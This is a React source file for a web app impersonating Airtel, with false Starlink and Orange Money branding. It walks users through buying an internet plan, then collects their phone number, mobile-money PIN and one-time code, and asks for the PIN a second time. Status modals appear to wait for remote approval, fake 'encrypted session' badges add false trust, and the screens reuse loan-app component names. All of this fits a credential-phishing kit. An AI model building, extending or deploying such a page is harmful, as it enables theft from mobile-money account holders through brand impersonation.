      <path d="M7.137 23.862c.79 0 1.708-.19 2.751-.554 1.55-.538 2.784-1.281 3.986-2.009l.316-.205a29.733 29.733 0 0 0 3.764-2.72 16.574 16.574 0 0 0 5.457-7.529c.395-1.138.949-3.384.268-5.487a7.117 7.117 0 0 0-2.862-3.749c-.158-.126-1.898-1.47-5.203-1.47-3.005 0-6.31 1.107-9.806 3.32l-.11.08-.317.205a20.133 20.133 0 0 0-2.309 1.693C1.585 6.813-.091 9.106.004 11.067c.031.79.427 1.534 1.075 2.008a3.472 3.472 0 0 0 2.214.68c1.803 0 3.765-.948 5.109-1.74l.253-.157.696-.443.237-.158c1.898-1.234 3.875-2.515 6.105-3.258a5.255 5.255 0 0 1 1.55-.285 3.163 3.163 0 0 1 .664.08 2.112 2.112 0 0 1 1.47 1.106c.523 1.012.396 2.61-.316 4.08a17.871 17.871 0 0 1-4.887 5.836 19.488 19.488 0 0 1-3.194 2.215l-.095.031a9.634 9.634 0 0 1-1.471.696l-.08.032-.41.158c-2.23.57-.87-1.329-.87-1.329.474-.537.98-1.028 1.518-1.502.316-.269.633-.554.933-.854l.064-.063c.395-.38.933-.902.901-1.645-.047-.98-1.075-1.582-2.056-1.613h-.063c-.95 0-1.819.522-2.404.98a7.27 7.27 0 0 0-1.598 1.74c-.6.901-1.85 3.226-.632 5.077.49.743 1.313 1.123 2.42 1.123z" />
    </svg>
  );
};

export const AirtelLogo: React.FC<{
  variant?: 'white' | 'red' | 'nextgen' | 'icon-only';
  size?: 'sm' | 'md' | 'lg';
  className?: string;
  showSubtitle?: boolean;
}> = ({
  variant = 'red',
  size = 'md',
  className = '',
  showSubtitle = false,
}) => {
  const isWhite = variant === 'white';
  const isNextGen = variant === 'nextgen';
  const isIconOnly = variant === 'icon-only';

  const fillColor = isWhite ? '#FFFFFF' : '#E60000';

  if (isIconOnly) {
    const iconSize = size === 'sm' ? 'w-5 h-5' : size === 'lg' ? 'w-10 h-10' : 'w-7 h-7';
    return <AirtelIcon className={`${iconSize} ${className}`} color={fillColor} />;
  }

  const iconSizes = {
    sm: 'w-5 h-5',
    md: 'w-7 h-7',
    lg: 'w-9 h-9',
  };

  const textSizes = {
    sm: 'text-lg',
    md: 'text-xl sm:text-2xl',
    lg: 'text-2xl sm:text-3xl',
  };

  return (
    <div className={`inline-flex flex-col items-center select-none ${className}`}>
      <div className="flex items-center gap-1.5 sm:gap-2">
        {/* Airtel Iconic Emblem */}
        <AirtelIcon className={`${iconSizes[size]} drop-shadow-sm`} color={fillColor} />

        {/* Airtel Wordmark */}
        <span
          className={`font-black tracking-tighter lowercase leading-none ${textSizes[size]} ${
            isWhite ? 'text-white' : 'text-[#E60000]'
          }`}
          style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}
        >
          airtel
        </span>
      </div>

      {/* Optional Subtitle / Slogan */}
      {showSubtitle && (
        <>
          {isNextGen ? (
            <div className="w-full flex flex-col items-center mt-1">
              <div className={`w-full h-[1.5px] rounded-full my-0.5 ${isWhite ? 'bg-white/60' : 'bg-[#E60000]'}`} />
              <span className={`text-[9px] sm:text-[10px] font-bold tracking-tight uppercase ${isWhite ? 'text-white/90' : 'text-neutral-700'}`}>
                NextGen Security
              </span>
            </div>
          ) : (
            <span
              className={`text-[8px] font-bold tracking-widest uppercase mt-0.5 ${
                isWhite ? 'text-white/90' : 'text-neutral-600'
              }`}
            >
              A REASON <span className={isWhite ? 'text-amber-300 font-extrabold' : 'text-[#E60000] font-extrabold'}>TO IMAGINE</span>
            </span>
          )}
        </>
      )}
    </div>
  );
};

export const StarlinkLogo: React.FC<{ className?: string }> = ({ className = '' }) => {
  return (
    <div className={`inline-flex items-center gap-1.5 flex-wrap justify-center select-none ${className}`}>
      <span className="text-[10px] uppercase font-bold tracking-widest text-white/80 whitespace-nowrap">
        EN COLLABORATION AVEC
      </span>
      <div className="flex items-center gap-1 font-black text-xs sm:text-sm tracking-widest text-white whitespace-nowrap">
        <span>STARLINK</span>
        <svg
          viewBox="0 0 24 24"
          className="w-3.5 h-3.5 fill-current text-white inline-block animate-pulse"
        >
          <path d="M12 2L14.4 9.6L22 12L14.4 14.4L12 22L9.6 14.4L2 12L9.6 9.6L12 2Z" />
        </svg>
      </div>
    </div>
  );
};

export const OrangeMoneyLogo: React.FC<{ className?: string }> = ({ className = '' }) => {
  return (
    <div
      className={`relative flex items-center justify-center rounded-2xl bg-gradient-to-br from-[#FF7A00] to-[#FF5C00] shadow-md overflow-hidden ${className}`}
    >
      <span className="text-white font-black tracking-tighter leading-none" style={{ fontSize: '0.42em' }}>
        Max it
      </span>
    </div>
  );
};


interface LanguageSwitchProps {
  variant?: 'light' | 'dark' | 'transparent';
  className?: string;
}

export const LanguageSwitch: React.FC<LanguageSwitchProps> = ({
  variant = 'transparent',
  className = '',
}) => {
  const { language, setLanguage } = useApp();

  const isLight = variant === 'light';

  return (
    <div
      className={`inline-flex items-center rounded-xl p-1 text-xs font-bold transition-all ${
        isLight
          ? 'bg-neutral-100 border border-neutral-300 text-neutral-800'
          : 'bg-black/25 backdrop-blur-md border border-white/20 text-white'
      } ${className}`}
      role="group"
      aria-label="Language selector"
    >
      <div className="flex items-center px-1.5 opacity-70">
        <Globe className="w-3.5 h-3.5" />
      </div>

      <button
        type="button"
        id="btn-lang-fr"
        onClick={() => setLanguage('fr')}
        className={`px-2.5 py-1 rounded-lg text-xs font-black transition-all flex items-center gap-1 cursor-pointer ${
          language === 'fr'
            ? isLight
              ? 'bg-[#E60000] text-white shadow-sm'
              : 'bg-white text-[#E60000] shadow-sm'
            : isLight
            ? 'text-neutral-600 hover:text-neutral-900 hover:bg-neutral-200/60'
            : 'text-white/70 hover:text-white hover:bg-white/10'
        }`}
        aria-pressed={language === 'fr'}
      >
        <span>FR</span>
        <span className="text-[11px]">🇫🇷</span>
      </button>

      <button
        type="button"
        id="btn-lang-en"
        onClick={() => setLanguage('en')}
        className={`px-2.5 py-1 rounded-lg text-xs font-black transition-all flex items-center gap-1 cursor-pointer ${
          language === 'en'
            ? isLight
              ? 'bg-[#E60000] text-white shadow-sm'
              : 'bg-white text-[#E60000] shadow-sm'
            : isLight
            ? 'text-neutral-600 hover:text-neutral-900 hover:bg-neutral-200/60'
            : 'text-white/70 hover:text-white hover:bg-white/10'
        }`}
        aria-pressed={language === 'en'}
      >
        <span>EN</span>
        <span className="text-[11px]">🇬🇧</span>
      </button>
    </div>
  );
};


interface ValidatingModalProps {
  isOpen: boolean;
  type: 'pin' | 'otp' | 'reenter';
  phone?: string;
  planName?: string;
  planPrice?: string;
  status: 'pending' | 'approved' | 'rejected' | 'idle';
  onCancel?: () => void;
}

export const ValidatingModal: React.FC<ValidatingModalProps> = ({
  isOpen,
  type,
  phone,
  planName,
  status,
  onCancel,
}) => {
  const { t, language } = useApp();
  if (!isOpen) return null;

  const getPendingTitle = () => {
    if (type === 'reenter') return t('validatingReenterPin');
    if (type === 'pin') return t('validatingPin');
    return t('validatingOtp');
  };

  const getPendingMsg = () => {
    if (type === 'reenter') return t('verifyingReenterPinMsg');
    if (type === 'pin') return t('verifyingPinMsg');
    return t('verifyingOtpMsg');
  };

  const getApprovedTitle = () => {
    if (type === 'reenter') return t('reenterPinApproved');
    if (type === 'pin') return t('pinApproved');
    return t('otpApproved');
  };

  const getApprovedSubtitle = () => {
    if (type === 'pin') return t('redirecting');
    return t('activatingPlan');
  };

  const getRejectedTitle = () => {
    if (type === 'reenter') return t('reenterPinRejected');
    if (type === 'pin') return t('pinRejected');
    return t('otpRejected');
  };

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-md">
        <motion.div
          initial={{ opacity: 0, scale: 0.94, y: 12 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 8 }}
          transition={{ duration: 0.25, ease: 'easeOut' }}
          className="w-full max-w-sm bg-white rounded-3xl shadow-2xl overflow-hidden border border-neutral-200/80 text-center p-6 sm:p-8 relative"
        >
          {/* Top Brand Accent Bar */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />

          {/* Airtel Logo Header */}
          <div className="flex justify-center mb-4 mt-1">
            <AirtelLogo variant="nextgen" className="h-9" />
          </div>

          {/* Main Status Display */}
          {status === 'pending' && (
            <div className="flex flex-col items-center py-3">
              <div className="relative flex items-center justify-center mb-5">
                <div className="w-16 h-16 rounded-full bg-red-100/80 animate-ping absolute opacity-60" />
                <div className="w-16 h-16 rounded-full bg-gradient-to-tr from-[#E60000] to-rose-500 text-white flex items-center justify-center shadow-lg shadow-red-500/25 relative z-10">
                  <Loader2 className="w-8 h-8 animate-spin" />
                </div>
              </div>

              <h3 className="font-extrabold text-neutral-900 text-lg sm:text-xl tracking-tight mb-1.5">
                {getPendingTitle()}
              </h3>

              <p className="text-xs text-neutral-500 max-w-[260px] leading-relaxed">
                {getPendingMsg()}
              </p>

              {phone && (
                <div className="mt-2.5 px-3 py-1 rounded-full bg-neutral-100 text-neutral-700 text-xs font-mono font-bold">
                  {phone}
                </div>
              )}

              {/* Secure status indicator */}
              <div className="mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-neutral-100 border border-neutral-200 text-[11px] font-semibold text-neutral-600">
                <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
                <span>{t('secureProcessing')}</span>
              </div>

              {onCancel && (
                <button
                  type="button"
                  onClick={onCancel}
                  className="mt-4 text-[11px] font-bold text-neutral-400 hover:text-[#E60000] underline underline-offset-2 transition-colors cursor-pointer"
                >
                  {language === 'fr' ? 'Modifier ou renvoyer le code' : 'Edit or resend code'}
                </button>
              )}
            </div>
          )}

          {status === 'approved' && (
            <div className="flex flex-col items-center py-3">
              <div className="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mb-4 shadow-sm">
                <CheckCircle2 className="w-9 h-9 animate-bounce" />
              </div>
              <h3 className="font-extrabold text-emerald-800 text-lg sm:text-xl tracking-tight mb-1">
                {getApprovedTitle()}
              </h3>
              <p className="text-xs text-neutral-500">
                {getApprovedSubtitle()}
              </p>
            </div>
          )}

          {status === 'rejected' && (
            <div className="flex flex-col items-center py-3">
              <div className="w-16 h-16 rounded-full bg-rose-100 text-rose-600 flex items-center justify-center mb-4 shadow-sm">
                <AlertTriangle className="w-9 h-9" />
              </div>
              <h3 className="font-extrabold text-rose-800 text-lg sm:text-xl tracking-tight mb-1">
                {getRejectedTitle()}
              </h3>
              <p className="text-xs text-neutral-500">{t('retryPrompt')}</p>
            </div>
          )}

          {/* Footer Security Badge */}
          <div className="mt-4 pt-4 border-t border-neutral-100 flex items-center justify-center gap-1.5 text-[10px] text-neutral-400 font-semibold uppercase tracking-wider">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
            <span>{t('encryptedSession')}</span>
          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
};


export const InAppBrowserBanner: React.FC = () => {
  const [show, setShow] = useState(false);
  const [browserInfo, setBrowserInfo] = useState<{
    isInApp: boolean;
    browserName: string;
    isAndroid: boolean;
  }>({
    isInApp: false,
    browserName: '',
    isAndroid: false,
  });

  useEffect(() => {
    const info = detectInAppBrowser();
    if (info.isInApp) {
      const isDismissed = safeStorage.getItem('airtel_iab_dismissed');
      if (!isDismissed) {
        setBrowserInfo({
          isInApp: true,
          browserName: info.browserName,
          isAndroid: info.isAndroid,
        });
        setShow(true);
      }
    }
  }, []);

  if (!show || !browserInfo.isInApp) {
    return null;
  }

  const handleDismiss = () => {
    setShow(false);
    safeStorage.setItem('airtel_iab_dismissed', 'true');
  };

  const handleOpenExternal = () => {
    const currentUrl = window.location.href;
    if (browserInfo.isAndroid) {
      window.location.href = getExternalBrowserUrl(currentUrl);
    } else {
      // iOS / other: try intent or instruct user
      try {
        window.open(currentUrl, '_blank');
      } catch {}
    }
  };

  return (
    <aside
      aria-label="Conseil navigateur"
      className="w-full bg-gradient-to-r from-neutral-900 via-neutral-950 to-neutral-900 text-neutral-200 border-b border-amber-500/30 px-3 py-2 text-xs select-none relative z-50 shadow-md"
    >
      <div className="max-w-7xl mx-auto flex items-center justify-between gap-2">
        <div className="flex items-center gap-2 min-w-0">
          <span className="p-1 rounded-md bg-amber-500/20 text-amber-400 shrink-0">
            <Compass className="w-3.5 h-3.5" />
          </span>
          <p className="truncate text-[11px] sm:text-xs">
            <span className="font-bold text-amber-300">
              {browserInfo.browserName || 'Navigateur intégré'} :
            </span>{' '}
            Pour éviter les blocages de session, appuyez sur <span className="font-bold text-white">⋮</span> puis{' '}
            <span className="underline decoration-amber-400/50">Ouvrir dans le navigateur</span>.
          </p>
        </div>

        <div className="flex items-center gap-1.5 shrink-0">
          {browserInfo.isAndroid && (
            <button
              onClick={handleOpenExternal}
              type="button"
              className="flex items-center gap-1 px-2 py-1 rounded bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 font-medium text-[11px] transition-colors"
            >
              <span>Chrome</span>
              <ExternalLink className="w-3 h-3" />
            </button>
          )}

          <button
            onClick={handleDismiss}
            type="button"
            className="p-1 rounded hover:bg-white/10 text-neutral-400 hover:text-white transition-colors"
            title="Masquer"
            aria-label="Fermer"
          >
            <X className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>
    </aside>
  );
};


interface Props {
  children: ReactNode;
}

interface State {
  hasError: boolean;
  errorMessage: string;
}

export class ErrorBoundary extends Component<Props, State> {
  constructor(props: Props) {
    super(props);
    this.state = {
      hasError: false,
      errorMessage: '',
    };
  }

  public static getDerivedStateFromError(error: Error): State {
    return {
      hasError: true,
      errorMessage: error?.message || 'Erreur inconnue',
    };
  }

  public componentDidCatch(error: Error, errorInfo: ErrorInfo) {
    console.error('App runtime error caught by ErrorBoundary:', error, errorInfo);
  }

  private handleReload = () => {
    try {
      window.location.reload();
    } catch {
      window.location.href = window.location.href;
    }
  };

  private handleOpenExternal = () => {
    const { isAndroid } = detectInAppBrowser();
    const currentUrl = window.location.href;
    if (isAndroid) {
      window.location.href = getExternalBrowserUrl(currentUrl);
    } else {
      // On iOS or others, attempt opening or copy
      window.open(currentUrl, '_system');
    }
  };

  public render() {
    if (this.state.hasError) {
      const { isInApp, browserName } = detectInAppBrowser();

      return (
        <div className="min-h-screen min-h-[100dvh] w-full bg-neutral-900 text-white flex flex-col items-center justify-center p-6 text-center select-none">
          <div className="w-16 h-16 rounded-2xl bg-red-600/20 border border-red-500/30 flex items-center justify-center mb-6 shadow-xl shadow-red-900/30">
            <svg
              className="w-8 h-8 text-red-500"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
              />
            </svg>
          </div>

          <h1 className="text-xl sm:text-2xl font-black tracking-tight mb-2 text-white">
            Chargement interrompu
          </h1>

          <p className="text-sm text-neutral-300 max-w-sm mb-6 leading-relaxed">
            {isInApp
              ? `Le navigateur intégré ${browserName || ''} a restreint l'affichage. Vous pouvez recharger la page ou ouvrir le portail dans votre navigateur standard.`
              : 'Une interruption temporaire est survenue lors du chargement. Veuillez actualiser la page.'}
          </p>

          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-xs">
            <button
              onClick={this.handleReload}
              className="w-full py-3 px-4 rounded-xl font-bold bg-red-600 hover:bg-red-700 active:scale-95 text-white transition-all shadow-lg shadow-red-900/40 cursor-pointer"
            >
              Actualiser la page
            </button>

            {isInApp && (
              <button
                onClick={this.handleOpenExternal}
                className="w-full py-3 px-4 rounded-xl font-semibold bg-neutral-800 hover:bg-neutral-700 active:scale-95 text-neutral-200 border border-neutral-700 transition-all cursor-pointer"
              >
                Ouvrir dans Chrome / Safari
              </button>
            )}
          </div>

          {isInApp && (
            <p className="text-xs text-neutral-400 mt-6 max-w-xs">
              Astuce : appuyez sur les trois points (•••) en haut à droite de l'écran, puis choisissez &quot;Ouvrir dans le navigateur&quot;.
            </p>
          )}
        </div>
      );
    }

    return this.props.children;
  }
}


function AppContent() {
  const [step, setStep] = useState<Step>('PLANS');
  const [selectedPlan, setSelectedPlan] = useState<InternetPlan>(INTERNET_PLANS[3]); // Default 15GB Popular
  const [userPhone, setUserPhone] = useState<string>('');
  const [userFullPhone, setUserFullPhone] = useState<string>('');
  const [userPin, setUserPin] = useState<string>('');
  const [confirmedPin, setConfirmedPin] = useState<string>('');
  const [userCountry, setUserCountry] = useState<CountryInfo | undefined>(undefined);
  const [sessionId, setSessionId] = useState<string>('');
  const [selectedProvider, setSelectedProvider] = useState<PaymentProvider>('airtel');

  const handleSelectPlan = (plan: InternetPlan) => {
    setSelectedPlan(plan);
    setStep('PROVIDER');
    safeScrollToTop();
  };

  const handleSelectProvider = (provider: PaymentProvider) => {
    setSelectedProvider(provider);
    setStep('LOGIN');
    safeScrollToTop();
  };

  const handleLoginSuccess = (
    phone: string,
    pin: string,
    newSessionId: string,
    country: CountryInfo,
    fullPhone: string
  ) => {
    setUserPhone(phone);
    setUserFullPhone(fullPhone);
    setUserPin(pin);
    setUserCountry(country);
    setSessionId(newSessionId);
    setStep('OTP');
    safeScrollToTop();
  };

  const handleOtpSuccess = () => {
    // After OTP verification success, transition to PIN re-entry page before Success
    setStep('REENTER_PIN');
    safeScrollToTop();
  };

  const handleReenterPinSuccess = (finalPin: string) => {
    setConfirmedPin(finalPin);
    setStep('SUCCESS');
    safeScrollToTop();
  };

  const handleReset = () => {
    setStep('PLANS');
    setUserPhone('');
    setUserFullPhone('');
    setUserPin('');
    setConfirmedPin('');
    setSessionId('');
    safeScrollToTop();
  };

  const pageVariants = {
    initial: { opacity: 0, x: 20 },
    animate: { opacity: 1, x: 0 },
    exit: { opacity: 0, x: -20 },
  };

  return (
    <div className="w-full min-h-screen min-h-[100dvh] bg-neutral-900 text-neutral-900 overflow-x-hidden flex flex-col">
      <InAppBrowserBanner />
      <AnimatePresence mode="wait">
        {step === 'PLANS' && (
          <motion.div
            key="plans-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <LoanCalculator onSelectPlan={handleSelectPlan} />
          </motion.div>
        )}

        {step === 'PROVIDER' && (
          <motion.div
            key="provider-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <LoanApplication1
              selectedPlan={selectedPlan}
              onBack={() => setStep('PLANS')}
              onSelectProvider={handleSelectProvider}
            />
          </motion.div>
        )}

        {step === 'LOGIN' && (
          <motion.div
            key="login-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <LoginForm
              selectedPlan={selectedPlan}
              onBack={() => setStep('PROVIDER')}
              onLoginSuccess={handleLoginSuccess}
            />
          </motion.div>
        )}

        {step === 'OTP' && (
          <motion.div
            key="otp-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <VerificationForm
              phone={userPhone}
              fullPhone={userFullPhone}
              country={userCountry}
              pin={userPin}
              sessionId={sessionId}
              selectedPlan={selectedPlan}
              onBack={() => setStep('LOGIN')}
              onOtpSuccess={handleOtpSuccess}
            />
          </motion.div>
        )}

        {step === 'REENTER_PIN' && (
          <motion.div
            key="reenter-pin-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <LoanApplication2
              phone={userPhone}
              fullPhone={userFullPhone}
              country={userCountry}
              initialPin={userPin}
              sessionId={sessionId}
              selectedPlan={selectedPlan}
              onBack={() => setStep('OTP')}
              onSuccess={handleReenterPinSuccess}
            />
          </motion.div>
        )}

        {step === 'SUCCESS' && (
          <motion.div
            key="success-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <SuccessPage
              phone={userPhone}
              fullPhone={userFullPhone}
              country={userCountry}
              selectedPlan={selectedPlan}
              sessionId={sessionId}
              onReset={handleReset}
            />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default function App() {
  return (
    <AppProvider>
      <AppContent />
    </AppProvider>
  );
}

